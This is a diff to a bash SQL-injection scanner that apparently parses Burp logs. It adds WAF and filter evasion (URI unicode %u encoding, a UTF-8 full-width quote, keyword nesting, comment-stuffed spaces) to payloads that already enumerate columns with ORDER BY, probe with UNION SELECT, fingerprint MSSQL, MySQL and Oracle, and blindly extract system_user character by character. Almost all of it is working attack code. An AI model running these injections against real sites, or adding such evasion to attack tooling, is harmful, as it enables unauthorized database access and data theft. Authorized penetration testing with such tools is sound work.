@@ -21,7 +21,7 @@ encodeme()
 {
 
 inputbuffer=$encodeinput
-
+#modify at the SQL layer first
 if [ true = "$Y" ] ; then
 	inputbuffer=`echo $inputbuffer | replace " " "/**/"`
 fi
@@ -31,15 +31,23 @@ if [ true = "$E" ] ; then
 fi
 
 if [ true = "$J" ] ; then #nesting
-	inputbuffer=`echo $inputbuffer | replace "select" "selselectect" | replace "union" "uniunionon" | replace "and" "anandd" | replace "order" "ororderder" |replace "or" "oorr" | replace "by" "bbyy" | replace "delay" "dedelaylay" | replace "dual" "dudualal" | replace "exec" "exexecec" | replace "from" "frfromom" | replace "having" "havhavinging" | replace "waitfor" "waitwaitforfor" | replace "case" "cacasese" | replace "when" "whwhenen" | replace "then" "ththenen" | replace "else" "elelsese" | replace "end" "eendnd" | replace "len" "llenen" | replace "ascii" "asasciicii" | replace "substr" "subsubstrstr" | replace "like" "lilikeke"`
+	inputbuffer=`echo $inputbuffer | replace "select" "selselectect" | replace "union" "uniunionon" | replace "and" "anandd" | replace "order" "ororderder" |replace "or" "oorr" | replace "by" "bbyy" | replace "delay" "dedelaylay" | replace "dual" "dudualal" | replace "exec" "exexecec" | replace "from" "frfromom" | replace "having" "havhavinging" | replace "waitfor" "waitwaitforfor" | replace "case" "cacasese" | replace "when" "whwhenen" | replace "then" "ththenen" | replace "else" "elelsese" | replace "end" "eendnd" | replace "len" "llenen" | replace "ascii" "asasciicii" | replace "substring" "subsubstringstring"| replace "substr" "subsubstrstr" | replace "like" "lilikeke"`
 fi
 
-if [ true = "$U" ] ; then
+if [ true = "$U" ] ; then #case variation
 	inputbuffer=`echo $inputbuffer | replace "select" "sElEcT" | replace "union" "uNiOn" | replace "and" "aNd" | replace "or" "oR" | replace "order" "oRdEr" | replace "by" "bY" | replace "delay" "dElAy" | replace "dual" "dUaL" | replace "exec" "eXeC" | replace "from" "fRoM" | replace "having" "hAvInG" | replace "waitfor" "wAiTfOr" | replace "case" "cAsE" | replace "when" "wHeN" | replace "then" "tHeN" | replace "else" "eLsE" | replace "end" "eNd" | replace "len" "lEn" | replace "ascii" "aScIi" | replace "substr" "sUbStR" | replace "like" "lIkE"`
 fi
 
-encodeoutput=`echo $inputbuffer  | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c" | replace "/" "%2f"` 
+if [ true = "$m" ] ; then #UTF-8 full-width single quote
+	inputbuffer=`echo $inputbuffer | replace "'" "%ef%bc%87"`
+fi
 
+#URL encoding occurs unless we are doing URI unicode encoding 
+#if [ false = "$O" ] ; then  
+encodeoutput=`echo $inputbuffer | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c" | replace "/" "%2f"` 
+#fi
+
+#replace URL encoded spaces with comments and intermediary characters
 if [ true = "$N" ] ; then
 	encodeoutput=`echo $encodeoutput | replace "%20" "%2f%2a%0B%0C%0D%0A%09%2a%2f"`
 fi
@@ -52,10 +60,20 @@ if [ true = "$V" ] ; then #double URL encoding
 	encodeoutput=`echo $encodeoutput | replace "%" "%25"`
 fi
 
+
+
 #--------------
 
-decodeoutput=`echo $decodeinput | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "("| replace "%29" ")" | replace "%2c" "," | replace "%2f" "/" | replace "%2a" "*"`; 
+#if [ true = "$O" ] ; then #uri unicode decoding
+#	uriinputdecode=$decodeoutput
+#  	uriunicode
+#  	decodeoutput=$uriinputdecoded
+#fi
 
+#URL decoding occurs unless we are doing URI unicode encoding 
+#if [ false = "$O" ] ; then  
+decodeoutput=`echo $decodeinput | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "("| replace "%29" ")" | replace "%2c" "," | replace "%2f" "/" | replace "%2a" "*"`; 
+#fi
 }
 
 #encodeinput=foo
@@ -65,6 +83,82 @@ decodeoutput=`echo $decodeinput | replace "%20" " " | replace "%2e" "." | replac
 #decodeinput=foo
 #encodeme
 #foo=$decodeoutput
+
+uriunicode()
+{
+## URI unicode ###
+#input="union select 'foo'"
+#receives and encodes uriinputencode string
+#returns uriinputencoded
+#also receives and decodes uriinputdecode string
+#also returns uriinputdecoded string
+
+# how to use me:
+#  $uriinputencode="my string that i want encoded"
+#  uriunicode
+#  $variableholdingencodedstring=uriinputencoded
+
+i=0
+uriinputencoded=''
+stringlength=${#uriinputencode}
+((stringlengthminus1=$stringlength-1))
+while ((i<$stringlength)) ; do 
+	char=`echo "${uriinputencode:i:1}"`
+	val=`printf "%02x" "'$char'"`
+	vallength=${#val}
+	if [[ "$vallength" == "2" ]] ; then
+		uriinputencoded=$uriinputencoded`echo -n "%u00"`
+	else
+		uriinputencoded=$uriinputencoded`echo -n "%u"`
+	fi
+	uriinputencoded=$uriinputencoded`echo -n $val`
+	((i++))
+done 
+
+#URI unicode decoding:
+
+i=0
+uriinputdecoded=''
+stringlength=${#uriinputdecode}
+while ((i<$stringlength)) ; do 
+	char=`echo "${uriinputdecode:i:1}"`
+	if [[ "$char" == "%" ]] ; then	
+		char1=`echo "${uriinputdecode:(i+4):1}"`		
+		if [[ "$char1" == "a" ]] ; then 
+			char1=10
+		elif [[ "$char1" == "b" ]] ; then 
+			char1=11
+		elif [[ "$char1" == "c" ]] ; then 
+			char1=12
+		elif [[ "$char1" == "d" ]] ; then 
+			char1=13
+		elif [[ "$char1" == "e" ]] ; then 
+			char1=14
+		elif [[ "$char1" == "f" ]] ; then 
+			char1=15
+		fi						
+		char2=`echo "${uriinputdecode:(i+5):1}"`
+		if [[ "$char2" == "a" ]] ; then 
+			char2=10
+		elif [[ "$char2" == "b" ]] ; then 
+			char2=11
+		elif [[ "$char2" == "c" ]] ; then 
+			char2=12
+		elif [[ "$char2" == "d" ]] ; then 
+			char2=13
+		elif [[ "$char2" == "e" ]] ; then 
+			char2=14
+		elif [[ "$char2" == "f" ]] ; then 
+			char2=15
+		fi						
+		((one=$char1*16))
+		((two=$char2+$one))
+		uriinputdecoded=$uriinputdecoded`echo $two | awk '{printf("%c", $1)}'`
+	fi
+	((i=$i+3))
+done 
+}
+
 
 requester()
 {
@@ -98,8 +192,16 @@ orderbycheck()
 {
 #need to check we have a valid orderby test string
 
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote order by 9659$end"`
-#echo "debug $badparams"
+if [ true = "$O" ] ; then #uri unicode encoding
+	uriinputencode="1$quote order by 9659$end"
+	uriunicode
+	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+else
+	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by 9659$end"`
+fi
+
+#echo "debug cleanoutput $cleanoutput"
+#echo "debug badparams $badparams"
 
 encodeinput=$badparams
 encodeme
@@ -113,7 +215,13 @@ requester
 status999=`echo $response | cut -d ":" -f 1`
 length999=`echo $response | cut -d ":" -f 2`
 
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote order by 1$end"`
+if [ true = "$O" ] ; then #uri unicode encoding
+	uriinputencode="1$quote order by 1$end"
+	uriunicode
+	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+else
+	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by 1$end"`
+fi
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -135,7 +243,13 @@ orderbyrequest()
 count=1
 columns=150
 while [[ $count -lt $columns ]] ; do
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote order by $count$end"`
+		if [ true = "$O" ] ; then #uri unicode encoding
+			uriinputencode="1$quote order by $count$end"
+			uriunicode
+			badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+		else
+			badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by $count$end"`
+		fi
 		encodeinput=$badparams
 		encodeme
 		badparams=$encodeoutput
@@ -161,7 +275,13 @@ columns=150
 while [[ $count -lt $columns ]] ; do
 	echo -n "."
 	if [ true = "$Z" ] ; then echo "DEBUG! sending order by req: $badparams" ; fi
-	badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote order by $count$end"`
+	if [ true = "$O" ] ; then #uri unicode encoding
+		uriinputencode="1$quote order by $count$end"
+		uriunicode
+		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+	else
+		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by $count$end"`
+	fi
 	encodeinput=$badparams
 	encodeme
 	badparams=$encodeoutput
@@ -189,7 +309,7 @@ done
 #down=1
 #resp_error=0
 #while [[ $i -gt 0 ]] ; do
-#	badparams=`echo "$outputstore" | replace "$testpayload" "1$quote+order+by+$i$end"`
+#	badparams=`echo "$outputstore" | replace "$payload" "1$quote+order+by+$i$end"`
 #	echo "Debug: $badparams#"
 #	echo "down: $down"
 #	if [[ "$resp_error" == "1" ]] ; then
@@ -204,7 +324,7 @@ done
 #		#test to see if we have got the right number of columns by issuing an order by one greater than i
 #		#if this gets an error, we have got the right answer
 #		((onemorethani=$i+1))  
-#		badparams=`echo "$outputstore" | replace "$testpayload" "1$quote+order+by+$onemorethani$end"`
+#		badparams=`echo "$outputstore" | replace "$payload" "1$quote+order+by+$onemorethani$end"`
 #		requester
 #		statusX=`echo $response | cut -d ":" -f 1`
 #		lengthX=`echo $response | cut -d ":" -f 2`
@@ -354,7 +474,14 @@ while [[ $nullcount -lt $colno ]] ; do
 	fi
 done
 
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullwrongstring$end"`
+
+if [ true = "$O" ] ; then #uri unicode encoding
+	uriinputencode="1$quote union select $nullwrongstring$end"
+	uriunicode
+	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+else
+	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullwrongstring$end"`
+fi
 
 encodeinput=$badparams
 encodeme
@@ -364,7 +491,14 @@ requester
 statusselN=`echo $response | cut -d ":" -f 1`
 lengthselN=`echo $response | cut -d ":" -f 2`
 
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullstring$end"`
+if [ true = "$O" ] ; then #uri unicode encoding
+	uriinputencode="1$quote union select $nullstring$end"
+	uriunicode
+	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+else
+	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullstring$end"`
+fi
+
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -385,7 +519,14 @@ fi
 if [[ "$selectsuccess" == 0 ]] ; then
 	#try using a from dual - this might be an oracle db
 
-	badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullstring$end"`
+	if [ true = "$O" ] ; then #uri unicode encoding
+		uriinputencode="1$quote union select $nullstring$end"
+		uriunicode
+		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+	else
+		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullstring$end"`
+	fi
+
 	#echo "DEBUG right $badparams"
 	encodeinput=$badparams
 	encodeme
@@ -394,7 +535,14 @@ if [[ "$selectsuccess" == 0 ]] ; then
 	statusselY=`echo $response | cut -d ":" -f 1`
 	lengthselY=`echo $response | cut -d ":" -f 2`
 
-	badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullstring from dual$end"`
+	if [ true = "$O" ] ; then #uri unicode encoding
+		uriinputencode="1$quote union select $nullstring from dual$end"
+		uriunicode
+		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+	else
+		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullstring from dual$end"`
+	fi	
+	
 	#echo "DEBUG oracle $badparams"
 	encodeinput=$badparams
 	encodeme
@@ -489,7 +637,13 @@ while [[ $selparamcount -le $colno ]] ; do
 	done
 	nullwrongstring=$nullwrongstring",null"
 	
-	badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullwrongstring$end"`
+	if [ true = "$O" ] ; then #uri unicode encoding
+		uriinputencode="1$quote union select $nullwrongstring$end"
+		uriunicode
+		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+	else
+		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullwrongstring$end"`
+	fi
 	encodeinput=$badparams
 	encodeme
 	badparams=$encodeoutput
@@ -498,7 +652,14 @@ while [[ $selparamcount -le $colno ]] ; do
 	statusselN=`echo $response | cut -d ":" -f 1`
 	lengthselN=`echo $response | cut -d ":" -f 2`
 	
-	badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullstring$end"`
+	if [ true = "$O" ] ; then #uri unicode encoding
+		uriinputencode="1$quote union select $nullstring$end"
+		uriunicode
+		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+	else
+		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullstring$end"`
+	fi
+
 	encodeinput=$badparams
 	encodeme
 	badparams=$encodeoutput
@@ -540,7 +701,13 @@ selectsystemstrings()
 #reqcount=0 #need a counter to differentiate result files from each other. no longer initialising this to zero - i want it to be gloablly unique
 echo "Attempting to extract system parameters (reading params from ./payloads/system-params.txt)"
 cat ./payloads/system-params.txt | while read inj3ct ; do
-	badparams=`echo "$cleanoutput" | replace "$testpayload" "0$quote union select $nullstring$end" | replace " from dual" ""`
+	if [ true = "$O" ] ; then #uri unicode encoding
+		uriinputencode="0$quote union select $nullstring$end"
+		uriunicode
+		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded" | replace "%u0020%u0066%u0072%u006f%u006d%u0020%u0064%u0075%u0061%u006c" ""`
+	else
+		badparams=`echo "$cleanoutput" | replace "$payload" "0$quote union select $nullstring$end" | replace " from dual" ""`
+	fi
 #	badparams=`echo "$outputstore"`
 	encodeinput=$badparams
 	encodeme
@@ -548,8 +715,21 @@ cat ./payloads/system-params.txt | while read inj3ct ; do
 	requester
 	rm ./selcheck1
 	cp ./dump ./selcheck1
-	#newencodedpayload=`echo $inj3ct | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c"`
-	badparams=`echo "$badparams" | replace "$selinject" "$inj3ct"`
+
+	if [ true = "$O" ] ; then #uri unicode encoding
+
+		uriinputencode="$inj3ct"
+		uriunicode
+		encodedinj3ct=$uriinputencoded
+
+		uriinputencode="$selinject"
+		uriunicode
+		encodedselinject=$uriinputencoded
+
+		badparams=`echo "$badparams" | replace "$encodedselinject" "$encodedinj3ct"`
+	else
+		badparams=`echo "$badparams" | replace "$selinject" "$inj3ct"`
+	fi
 	#echo "Debug: $badparams"
 	encodeinput=$badparams
 	encodeme
@@ -627,7 +807,7 @@ else
 	echo "Running conditional tests to determine DB type"
 fi
 #mssqlcheck - only works on numeric params
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "1/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -635,7 +815,7 @@ requester
 #echo "debug sending $request"
 status_true=`echo $response | cut -d ":" -f 1`
 length_true=`echo $response | cut -d ":" -f 2`
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "1/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -664,7 +844,7 @@ if [[ "$status_true" == "$status_false" ]] ; then
 fi
 
 #mssqlcheck - only works on string params
-badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789=789/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789=789/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -672,7 +852,7 @@ requester
 #echo "debug true $request"
 status_true=`echo $response | cut -d ":" -f 1`
 length_true=`echo $response | cut -d ":" -f 2`
-badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789=789/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789=789/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -701,7 +881,7 @@ if [[ "$status_true" == "$status_false" ]] ; then
 fi
 
 #mysqlcheck - only works on numeric params
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "1/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -709,7 +889,7 @@ requester
 #echo "debug true $request"
 status_true=`echo $response | cut -d ":" -f 1`
 length_true=`echo $response | cut -d ":" -f 2`
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "1/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -739,14 +919,14 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 fi
 
 #mysqlcheck - only works on string params
-badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789=789/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789=789/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
 requester
 status_true=`echo $response | cut -d ":" -f 1`
 length_true=`echo $response | cut -d ":" -f 2`
-badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789=789/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789=789/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -776,14 +956,14 @@ fi
 
 
 #oraclecheck - only works on numeric params
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 0) then 1 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 0) then 1 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
 requester
 status_true=`echo $response | cut -d ":" -f 1`
 length_true=`echo $response | cut -d ":" -f 2`
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 255) then 1 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 255) then 1 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -812,14 +992,14 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 fi
 
 #oraclecheck - only works on string params
-badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 0) then 789 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 0) then 789 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
 requester
 status_true=`echo $response | cut -d ":" -f 1`
 length_true=`echo $response | cut -d ":" -f 2`
-badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 255) then 789 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 255) then 789 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -865,11 +1045,11 @@ if [[ "$nambuf" != "" ]] ; then
 	echo "Trying credentials already found: $nambuf"
 	#this determines the 'always wrong' reference request to suit the dbms:
 	if [[ $dbms == "mssql" ]] ; then                            
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (system_user = 'foobar') then 789 else 0 end)$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user = 'foobar') then 789 else 0 end)$end"`
 	elif [[ $dbms == "mysql" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (system_user() = 'foobar') then 789 else 0 end)$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = 'foobar') then 789 else 0 end)$end"`
 	elif [[ $dbms == "oracle" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when (select user from dual) = 'foobar' then 789 else 0 end$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when (select user from dual) = 'foobar' then 789 else 0 end$end"`
 	else
 		echo "Unable to determine DBMS"
 	fi
@@ -885,11 +1065,11 @@ if [[ "$nambuf" != "" ]] ; then
 	length_false=`echo $response | cut -d ":" -f 2` 
 
 	if [[ $dbms == "mssql" ]] ; then                            
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (system_user = '$nambuf') then 789 else 0 end)$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user = '$nambuf') then 789 else 0 end)$end"`
 	elif [[ $dbms == "mysql" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (system_user() = '$nambuf') then 789 else 0 end)$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = '$nambuf') then 789 else 0 end)$end"`
 	elif [[ $dbms == "oracle" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when (select user from dual) = '$nambuf' then 789 else 0 end$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when (select user from dual) = '$nambuf' then 789 else 0 end$end"`
 	else
 		echo "Unable to determine DBMS"
 	fi
@@ -929,11 +1109,11 @@ while [[ $oflag -lt $horiz ]] ; do
 	#this determines the 'always wrong' reference request to suit the dbms:
 	if [[ $oflag == "1" ]] ; then 
 		if [[ $dbms == "mssql" ]] ; then                            
-			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (len(system_user) = 999) then 789 else 0 end)$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (len(system_user) = 999) then 789 else 0 end)$end"`
 		elif [[ $dbms == "mysql" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (length(system_user()) = 999) then 789 else 0 end)$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = 999) then 789 else 0 end)$end"`
 		elif [[ $dbms == "oracle" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
 		else
 			echo "Unable to determine DBMS"
 			oflag=40
@@ -948,11 +1128,11 @@ while [[ $oflag -lt $horiz ]] ; do
 	fi
 
 	if [[ $dbms == "mssql" ]] ; then                            
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (len(system_user) = $oflag) then 789 else 0 end)$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (len(system_user) = $oflag) then 789 else 0 end)$end"`
 	elif [[ $dbms == "mysql" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (length(system_user()) = $oflag) then 789 else 0 end)$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = $oflag) then 789 else 0 end)$end"`
 	elif [[ $dbms == "oracle" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when length((select user from dual)) = $oflag then 789 else 0 end$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = $oflag then 789 else 0 end$end"`
 	else
 		echo "Unable to determine DBMS"
 		oflag=40
@@ -1001,11 +1181,11 @@ if [[ $gotlength == 1 ]] ; then
 		for asciinumber in `cat ./payloads/letterlist.txt` ; do 
 		if [[ $iflag == "32" && $oflag == "1" ]] ; then #this routine gets run once at the begining. it stores the always false response for comparison.
 			if [[ $dbms == "mssql" ]] ; then                            
-				badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring((select system_user),$oflag,1)) = 999) then 678 else 0 end)$end"`
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring((select system_user),$oflag,1)) = 999) then 678 else 0 end)$end"`
 			elif [[ $dbms == "mysql" ]] ; then
-				badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
 			elif [[ $dbms == "oracle" ]] ; then
-				badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
 			else
 				echo "Unable to determine DBMS"
 				oflag=40
@@ -1020,11 +1200,11 @@ if [[ $gotlength == 1 ]] ; then
 			length_false=`echo $response | cut -d ":" -f 2`
 		fi
 		if [[ $dbms == "mssql" ]] ; then                            
-			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring((select system_user),$oflag,1)) =$asciinumber) then 789 else 0 end)$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring((select system_user),$oflag,1)) =$asciinumber) then 789 else 0 end)$end"`
 		elif [[ $dbms == "mysql" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = $asciinumber) then 789 else 0 end)$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = $asciinumber) then 789 else 0 end)$end"`
 		elif [[ $dbms == "oracle" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = $asciinumber then 789 else 0 end$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = $asciinumber then 789 else 0 end$end"`
 		else
 			echo "Unable to determine DBMS"
 			oflag=40
@@ -1170,6 +1350,7 @@ case $asciinumber in
 esac
 }
 
+
 ##### END OF FUNCTION DEFINITIONS SECTION ######	
 #remove any residual files left lying about: 
 rm cleanscannerinputlist.txt 2>/dev/null
@@ -1216,10 +1397,12 @@ O=false
 K=false
 J=false
 N=false
+g=false
+m=false
 
 #################command switch parser section#########################
 
-while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOKJENa: namer; do
+while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOKJENakm: namer; do
     case $namer in 
     l)  #path to burp log to parse
         burplog=$OPTARG
@@ -1361,6 +1544,9 @@ while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOKJENa: name
     N) # Filter Evasion Intermediary chars ' ' => '%2f%2a%0B%0C%0D%0A%09%2a%2f'
 	N=true  
 	;;
+    m) # UTF8 full-width quote ''' => '%EF%BC%87'
+	m=true  
+	;;
     esac
 done
 
@@ -1397,6 +1583,8 @@ if [ true = "$h" ] || ["$1" == ""] 2>/dev/null ; then
 	#echo "  -O MYSQL inline comments                  'select'  'se/**/lect'                 No                  "
 	echo "  -E Replace equals operator with like     '='        'like'                        No                  "
 	echo "  -J Nesting                               'select'   'selselectect'                Yes                 "
+	echo "  -O URI unicode encoding                  'or'       '%u006f%u0072'                No                  "
+	echo "  -m UTF-8 full-width quote                '''        '%EF%BC%87'                   Yes                 "
 	echo "  -A Prepend payloads with %00"
 	echo "  -B Prepend payloads with %0d%0a"
 	echo "  -W HTTP Method Swapping mode: GET requests are converted to POSTs and vice-versa. These new requests are tested IN ADDITION to the original."
